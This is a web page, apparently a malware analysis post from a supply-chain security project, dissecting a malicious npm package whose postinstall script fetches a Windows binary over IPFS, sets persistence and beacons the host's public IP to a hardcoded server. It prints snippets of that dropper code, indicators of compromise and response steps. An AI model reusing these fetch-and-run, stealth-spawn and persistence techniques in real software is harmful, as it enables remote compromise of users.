@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>api-rs-node: a fake Rust bridge that doxxed its own author - The Atomdrift Project</title>
+  <meta name="description" content="Open-source, offline supply-chain attack detection for the AI age. Across binaries, scripts, and source — Apache 2.0.">
+
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="api-rs-node: a fake Rust bridge that doxxed its own author - The Atomdrift Project">
+  <meta property="og:description" content="Open-source, offline supply-chain attack detection for the AI age. Across binaries, scripts, and source — Apache 2.0.">
+
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='0.9em' font-size='90'>%E2%9A%9B</text></svg>">
+
+  <link rel="alternate" type="application/atom+xml" title="Atomdrift News" href="/feed.xml">
+  <link rel="alternate" type="application/atom+xml" title="Atomdrift Discoveries" href="/discoveries/feed.xml">
+  <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+
+  <div class="site-header">
+    <div class="header-inner">
+      <div class="logo-block">
+        <a href="/">
+          <svg class="atom-logo" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+            <circle cx="50" cy="50" r="6" fill="#3b82f6"/>
+            <ellipse cx="50" cy="50" rx="38" ry="14" fill="none" stroke="#0a0a0a" stroke-width="1.5" transform="rotate(-30 50 50)"/>
+            <ellipse cx="50" cy="50" rx="38" ry="14" fill="none" stroke="#0a0a0a" stroke-width="1.5" transform="rotate(30 50 50)"/>
+            <ellipse cx="50" cy="50" rx="38" ry="14" fill="none" stroke="#0a0a0a" stroke-width="1.5" transform="rotate(90 50 50)"/>
+            <circle cx="18" cy="28" r="3.5" fill="#d0ff00"/>
+            <circle cx="82" cy="28" r="3.5" fill="#d0ff00"/>
+            <circle cx="50" cy="88" r="3.5" fill="#d0ff00"/>
+          </svg>
+          <div class="logo-text">
+            <span class="logo-name">atom<span class="logo-accent">drift</span></span>
+            <span class="logo-tagline">Open-source, offline supply-chain attack detection for the AI age</span>
+          </div>
+        </a>
+      </div>
+      <div class="header-links">
+        <a href="https://codeberg.org/atomdrift" target="_blank">Codeberg</a>
+        <a href="https://lab.atomdrift.org/" class="hl" target="_blank">Lab</a>
+      </div>
+    </div>
+  </div>
+
+  <div class="toxic-stripe"></div>
+
+  <div class="nav">
+    <div class="nav-inner">
+      <a href="/">Home</a>
+      <a href="/news/">News</a>
+      <a href="/discoveries/" class="active">Discoveries</a>
+      <a href="/compare/">Compare</a>
+      <a href="/projects/">Projects</a>
+      <a href="/support/">Support</a>
+    </div>
+  </div>
+
+  <main>
+    
+<div class="main-full">
+  <div class="post-header">
+    <h1>api-rs-node: a fake Rust bridge that doxxed its own author</h1>
+    <span class="post-meta">2026-05-25 &middot; npm &middot; api-rs-node</span>
+  </div>
+  <div class="post-body discovery-body">
+    <p><code>api-rs-node@4.3.1</code> sells itself as a &quot;high-performance Rust bridge&quot;; it is a 292-line Windows dropper wrapped in a polished README, and its tarball ships the author's own filesystem layout by accident. An earlier draft went out 5½ hours before as <a href="/discoveries/2026/05/devcarron-clob/"><code>@devcarron/clob@2.73.0</code></a> from a separate gmail — same author, same payload, proof in that post.</p>
+<h2 id="stage-1%3A-clob.js" tabindex="-1"><a class="header-anchor" href="#stage-1%3A-clob.js"><span>Stage 1: <code>clob.js</code></span></a></h2>
+<p>The README is a polished Rust-bridge marketing page down to a benchmark table, but its install line still reads <code>npm install your-package-name</code>; the <code>package.json</code> carries no author, no license, no keywords, and one <code>postinstall</code> script:</p>
+<pre class="lang-js"><code>{
+  <span class="tok-str">"name"</span>: <span class="tok-str">"api-rs-node"</span>,
+  <span class="tok-str">"version"</span>: <span class="tok-str">"4.3.1"</span>,
+  <span class="tok-str">"description"</span>: <span class="tok-str">"High-performance Rust modules for Node.js with native speed and clean DX."</span>,
+  <span class="tok-str">"scripts"</span>: { <span class="tok-str">"postinstall"</span>: <span class="tok-str">"node clob.js"</span> },
+  <span class="tok-str">"main"</span>: <span class="tok-str">"clob.js"</span>
+}
+</code></pre>
+<p><code>clob.js</code> is wired for Windows only; the mac and Linux URLs are still <code>null</code> with <code>TODO</code> comments:</p>
+<pre class="lang-js"><code><span class="tok-kw">const</span> WIN_CID   = <span class="tok-str">'bafybeif3zkapj364ofnrvbty7oj5h5ufpxlp4s62usk3ulxrru35e3gssa'</span>;
+<span class="tok-kw">const</span> MAC_URL   = <span class="tok-kw">null</span>; <span class="tok-com">// TODO: set macOS binary URL</span>
+<span class="tok-kw">const</span> LINUX_URL = <span class="tok-kw">null</span>; <span class="tok-com">// TODO: set Linux binary URL</span>
+</code></pre>
+<p>It tries four IPFS gateways for <code>WIN_CID</code> in sequence, writes the result to <code>%LOCALAPPDATA%\windows defender host.exe</code>, registers persistence on all three platforms (the mac and Linux branches register and then bail with no payload), then POSTs the host's public IP — fetched from <code>api.ipify.org</code> — to a hardcoded IPv4 on a port that doubles as the year.</p>
+<p>Gateways:</p>
+<ul>
+<li><code>violet-tricky-quelea-562.mypinata.cloud</code> (private Pinata, optional <code>PINATA_GATEWAY_TOKEN</code>)</li>
+<li><code>cloudflare-ipfs.com</code></li>
+<li><code>gateway.pinata.cloud</code></li>
+<li><code>ipfs.io</code></li>
+</ul>
+<p>Persistence:</p>
+<ul>
+<li><strong>Windows:</strong> hidden VBS launcher (<code>oShell.Run &quot;...exe&quot;, 0, False</code>) + <code>HKCU\…\Run</code></li>
+<li><strong>macOS:</strong> <code>~/Library/LaunchAgents/com.clob.agent.plist</code> with <code>RunAtLoad=true</code></li>
+<li><strong>Linux:</strong> <code>~/.config/autostart/clob.desktop</code></li>
+</ul>
+<pre class="lang-js"><code><span class="tok-kw">const</span> reportPath = <span class="tok-tmpl">`/api/urls?url=<span class="tok-tmpl-expr">${encodeURIComponent(ip)}</span>`</span>;
+<span class="tok-kw">const</span> options = {
+  hostname: <span class="tok-str">'170.205.31.203'</span>,
+  port: 2026,
+  path: reportPath,
+  method: <span class="tok-str">'POST'</span>,
+};
+</code></pre>
+<p>Standard hidden-spawn recipe, every failure path silent:</p>
+<ul>
+<li>Spawn options: <code>detached: true</code>, <code>stdio: 'ignore'</code>, <code>windowsHide: true</code>, <code>child.unref()</code></li>
+<li>Failed download: silent <code>fs.unlink</code> on the partial file</li>
+<li>Timed-out install: <code>process.exit(0)</code> with no log</li>
+<li>Every catch block: <code>catch (_) {}</code></li>
+</ul>
+<h2 id="the-leak" tabindex="-1"><a class="header-anchor" href="#the-leak"><span>The leak</span></a></h2>
+<p>The tarball holds seven files, not two: a <code>config/</code> and <code>logs/</code> directory the code never references, leftover from the author's own file-explorer tool. <code>config/meta_data.json</code>:</p>
+<pre><code>{
+  "version": "0.2.3",
+  "abs_file_path_buf": "E:\\getting IP and check list\\clob-downloader\\config\\meta_data.json",
+  "abs_folder_path_buf_for_templates": "E:\\getting IP and check list\\clob-downloader\\config\\templates",
+  "all_volumes_with_information": [
+    { "mount_point": "C:\\", "size": 317725863936, "total_read_bytes": 423897711616, ... },
+    { "volume_name": "Programs", "mount_point": "D:\\", ... },
+    { "volume_name": "Data",     "mount_point": "E:\\", ... },
+    { "volume_name": "Etc",      "mount_point": "F:\\", ... }
+  ],
+  "current_running_os": "windows",
+  "current_cpu_architecture": "x86_64",
+  "user_home_dir": "C:\\Users\\mist"
+}
+</code></pre>
+<p>Publishing from <code>E:\getting IP and check list\clob-downloader\</code> dragged the tool's bookkeeping along: the Windows username <code>mist</code>, the project's working name, a four-volume NTFS layout, and lifetime per-volume read/write byte totals — a careful dropper undone by careless packaging.</p>
+<h2 id="stage-2%3A-what-the-cid-serves" tabindex="-1"><a class="header-anchor" href="#stage-2%3A-what-the-cid-serves"><span>Stage 2: what the CID serves</span></a></h2>
+<p>The CID resolves to a 4 MB Windows PE32+ with its PDB path intact — a complete Tauri-style desktop app, an Axum + Hyper + Tokio server fronting a React file-explorer UI whose own <code>config/</code> metadata is what leaked into the tarball.</p>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/300a7dea05c2a588757010ad314fa55cb8ef3acebaa284f58a5cd0fd39bce478"><code>300a7dea05c2a588757010ad314fa55cb8ef3acebaa284f58a5cd0fd39bce478</code></a></td>
+</tr>
+<tr>
+<td>PDB</td>
+<td><code>explr_server.pdb</code></td>
+</tr>
+<tr>
+<td>PDB GUID</td>
+<td><code>cd195463-cbd6-4917-a75d-49b312738bda</code></td>
+</tr>
+<tr>
+<td>Build timestamp</td>
+<td><code>2026-05-25T08:28:35Z</code> (nine hours before the tarball)</td>
+</tr>
+<tr>
+<td>Toolchain</td>
+<td>MSVC 14.44, no packer, full Rust crate paths in place</td>
+</tr>
+</tbody>
+</table>
+<p>Server surface:</p>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Startup banner</td>
+<td><code>Explr web server listening on http://…</code></td>
+</tr>
+<tr>
+<td>Routes</td>
+<td><code>/api/invoke</code> and <code>/api/download</code></td>
+</tr>
+<tr>
+<td>Auth</td>
+<td><code>Authorization: Bearer …</code></td>
+</tr>
+<tr>
+<td>Required env vars</td>
+<td><code>HOST</code>, <code>PORT</code>, <code>EXPLR_UI</code>, <code>AUTH_TOKEN</code></td>
+</tr>
+<tr>
+<td>Missing-config behaviour</td>
+<td>errors <code>Invalid HOST/PORT</code> and exits before binding</td>
+</tr>
+</tbody>
+</table>
+<p>Remote-execution endpoints (4 of 53 <code>invoke</code> commands):</p>
+<ul>
+<li><code>execute_command</code></li>
+<li><code>execute_command_improved</code></li>
+<li><code>execute_command_with_timeout</code></li>
+<li><code>request_full_disk_access</code></li>
+</ul>
+<p>Nothing in the binary indicates a stealer, and cleave's three hits are substring false positives off the React UI.</p>
+<p>Stealer markers, all absent:</p>
+<ul>
+<li>Browser creds: <code>Login Data</code>, <code>Cookies.db</code>, <code>key3.db</code>, <code>Local State</code>, <code>logins.json</code>, <code>nss3.dll</code></li>
+<li>Wallets / seeds: MetaMask, Phantom, Exodus, Atomic, Electrum, <code>wallet.dat</code>, mnemonic dictionaries</li>
+<li>Tokens: Discord, Telegram</li>
+<li>DPAPI: <code>CryptUnprotectData</code></li>
+</ul>
+<p>False positives:</p>
+<ul>
+<li><code>credential-access/browser/dpapi</code> on <code>v11</code> — a UI version string, not the DPAPI marker</li>
+<li><code>collection/file-targeting/filter</code> on <code>.seed</code> from a MIME table</li>
+<li><code>exfiltration/stealer/file</code> on <code>FindFirstVolumeW</code>, used to populate the drive sidebar</li>
+</ul>
+<p>Surviving traits — the Tauri surface itself:</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>Trait</th>
+<th>What it caught</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>command-and-control/backdoor/control/file-manager</code></td>
+<td>Tauri <code>*_sftp</code> + <code>execute_command*</code> exposed over HTTP</td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>discovery/system/fingerprint/info</code></td>
+<td><code>GetSystemInfo</code>, drive and volume enumeration</td>
+</tr>
+</tbody>
+</table>
+<h2 id="the-campaign-does-not-close-the-loop" tabindex="-1"><a class="header-anchor" href="#the-campaign-does-not-close-the-loop"><span>The campaign does not close the loop</span></a></h2>
+<p>As shipped, the chain between dropper and binary never connects, leaving the realistic victim population — a publicly addressable Windows host with all four env vars exported, nothing holding port 80, running <code>npm install</code> — approximately empty:</p>
+<ul>
+<li><strong>Windows-only.</strong> The mac and Linux branches exit before downloading; their persistence code is written but unreachable.</li>
+<li><strong>No environment handoff.</strong> Nothing propagates <code>HOST</code>, <code>PORT</code>, <code>EXPLR_UI</code>, or <code>AUTH_TOKEN</code>, so the server hits <code>Invalid HOST/PORT</code> and exits on every launch — persistence survives, the listener does not.</li>
+<li><strong>NAT assumption.</strong> The beacon reports the host's <em>public</em> IP, which behind NAT belongs to the edge router, not the box that ran <code>npm install</code>; C2 has nothing to connect back to.</li>
+</ul>
+<h2 id="dropper-traits" tabindex="-1"><a class="header-anchor" href="#dropper-traits"><span>Dropper traits</span></a></h2>
+<p>The <a href="https://lab.atomdrift.org/file/75a602995eeebbeee9c0af1e6e83f2384d5426cb64af78f4475f261add329410">Fallout report</a> returns malicious at probability 1.0, clustering on IPFS delivery, stealth spawn, multi-platform persistence, and the Windows Defender masquerade:</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>Trait</th>
+<th>What it caught</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>command-and-control/dropper/delivery/blockchain</code></td>
+<td>Four IPFS gateways fronting one CID</td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>command-and-control/dropper/execution/persistence</code></td>
+<td>Download → Run key + LaunchAgents + XDG autostart</td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>command-and-control/dropper/execution/stealth-spawn</code></td>
+<td><code>detached:true</code> + <code>stdio:'ignore'</code> + <code>windowsHide:true</code> + <code>unref()</code> co-located</td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>evasion/masquerade/identity/fabricated</code></td>
+<td>Drops as <code>windows defender host.exe</code></td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>command-and-control/channel/http-beacon</code></td>
+<td><code>POST /api/urls?url=&lt;ip&gt;</code> to <code>170.205.31.203:2026</code></td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>command-and-control/infrastructure/ip-port</code></td>
+<td>Hardcoded IPv4 endpoint, no DNS</td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>evasion/self-delete/file/script</code></td>
+<td><code>fs.unlink(dest, () =&gt; {})</code> on every failure path</td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>evasion/masquerade/identity/user-agent</code></td>
+<td>Chrome 124 UA in dropper requests</td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>persistence/system/launchd/core</code></td>
+<td>LaunchAgents plist with <code>RunAtLoad</code></td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>persistence/system/init/boot</code></td>
+<td><code>~/.config/autostart/clob.desktop</code></td>
+</tr>
+<tr>
+<td><span class="sev-dot notable" title="notable"></span></td>
+<td><code>persistence/login/registry/autostart</code></td>
+<td><code>HKCU\…\Run</code> with VBS launcher</td>
+</tr>
+</tbody>
+</table>
+<h2 id="likely-actor" tabindex="-1"><a class="header-anchor" href="#likely-actor"><span>Likely actor</span></a></h2>
+<p>Two <code>api-rs-node</code> versions went out ninety minutes apart from one fresh gmail, and the byte-identical <code>meta_data.json</code> ties them to the <a href="/discoveries/2026/05/devcarron-clob/"><code>@devcarron/clob</code></a> sibling published 5½ hours earlier from a different gmail — same Windows machine, same <code>mist</code> user, novice OPSEC paired with rising craftsmanship.</p>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Publisher</td>
+<td><code>shinydv412 &lt;shinydv412@gmail.com&gt;</code></td>
+</tr>
+<tr>
+<td><code>4.3.0</code> published</td>
+<td><code>2026-05-25T17:36:29Z</code></td>
+</tr>
+<tr>
+<td><code>4.3.1</code> published</td>
+<td><code>2026-05-25T19:05:48Z</code></td>
+</tr>
+<tr>
+<td>Files in tarball</td>
+<td>7 (<code>clob.js</code>, <code>package.json</code>, <code>README.md</code>, <code>config/×2</code>, <code>logs/×2</code>)</td>
+</tr>
+<tr>
+<td>Sibling publisher</td>
+<td><code>devcarron &lt;devcarron@gmail.com&gt;</code> (<code>@devcarron/clob@2.73.0</code>, <code>2026-05-25T11:59:04Z</code>)</td>
+</tr>
+<tr>
+<td>Author host (from bundled <code>meta_data.json</code>)</td>
+<td>Windows x86_64, username <code>mist</code>, project dir <code>E:\getting IP and check list\clob-downloader</code></td>
+</tr>
+</tbody>
+</table>
+<h2 id="indicators" tabindex="-1"><a class="header-anchor" href="#indicators"><span>Indicators</span></a></h2>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Package</td>
+<td><code>api-rs-node@4.3.1</code> (npm), also <code>4.3.0</code></td>
+</tr>
+<tr>
+<td>npm page</td>
+<td><a href="https://www.npmjs.com/package/api-rs-node">npmjs.com/package/api-rs-node</a></td>
+</tr>
+<tr>
+<td>Tarball SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/75a602995eeebbeee9c0af1e6e83f2384d5426cb64af78f4475f261add329410"><code>75a602995eeebbeee9c0af1e6e83f2384d5426cb64af78f4475f261add329410</code></a></td>
+</tr>
+<tr>
+<td><code>clob.js</code> SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/5839ea1afa6dc1237da3a9c59668b1e4e21e5dde2d2827daecf43a83400a7023"><code>5839ea1afa6dc1237da3a9c59668b1e4e21e5dde2d2827daecf43a83400a7023</code></a></td>
+</tr>
+<tr>
+<td><code>package.json</code> SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/00ec02844d57931db3abb8011ecc9aba3fa7165c701c7a60065e1d63abe53c44"><code>00ec02844d57931db3abb8011ecc9aba3fa7165c701c7a60065e1d63abe53c44</code></a></td>
+</tr>
+<tr>
+<td>C2 endpoint</td>
+<td><code>170.205.31.203:2026</code> (HTTP <code>POST /api/urls?url=&lt;public-ip&gt;:80</code>)</td>
+</tr>
+<tr>
+<td>IPFS payload CID</td>
+<td><code>bafybeif3zkapj364ofnrvbty7oj5h5ufpxlp4s62usk3ulxrru35e3gssa</code></td>
+</tr>
+<tr>
+<td>Private gateway</td>
+<td><code>violet-tricky-quelea-562.mypinata.cloud</code></td>
+</tr>
+<tr>
+<td>Public-IP lookup</td>
+<td><code>api.ipify.org</code></td>
+</tr>
+<tr>
+<td>Dropped Windows file</td>
+<td><code>%LOCALAPPDATA%\windows defender host.exe</code></td>
+</tr>
+<tr>
+<td>Run key</td>
+<td><code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run\clob</code></td>
+</tr>
+<tr>
+<td>Windows launcher</td>
+<td><code>%LOCALAPPDATA%\windows defender host-launcher.vbs</code></td>
+</tr>
+<tr>
+<td>macOS plist</td>
+<td><code>~/Library/LaunchAgents/com.clob.agent.plist</code></td>
+</tr>
+<tr>
+<td>Linux autostart</td>
+<td><code>~/.config/autostart/clob.desktop</code></td>
+</tr>
+<tr>
+<td>Publisher</td>
+<td><code>shinydv412 &lt;shinydv412@gmail.com&gt;</code></td>
+</tr>
+</tbody>
+</table>
+<h2 id="response" tabindex="-1"><a class="header-anchor" href="#response"><span>Response</span></a></h2>
+<ul>
+<li>Hunt npm caches, CI logs, and <code>%LOCALAPPDATA%</code> (plus the mac/Linux paths above) for the dropped filenames.</li>
+<li>In egress telemetry: outbound to <code>170.205.31.203:2026</code>, to <code>api.ipify.org</code>, and to the four gateways above carrying that CID.</li>
+<li>Rotate credentials reachable by any user that ran <code>npm install</code> on a Windows host that resolved <code>api-rs-node</code> since 2026-05-25.</li>
+<li>Treat the CID binary as untrusted; pull it for analysis from a throwaway identity.</li>
+</ul>
+
+  </div>
+  <p style="margin-top: 24px; font-size: 0.8125rem;"><a href="/discoveries/">&larr; All discoveries</a></p>
+</div>
+
+  </main>
+
+  <div class="site-footer">
+    <div class="footer-inner">
+      <span>&copy; 2026 The Atomdrift Project</span>
+    </div>
+  </div>
+
+</body>
+</html>
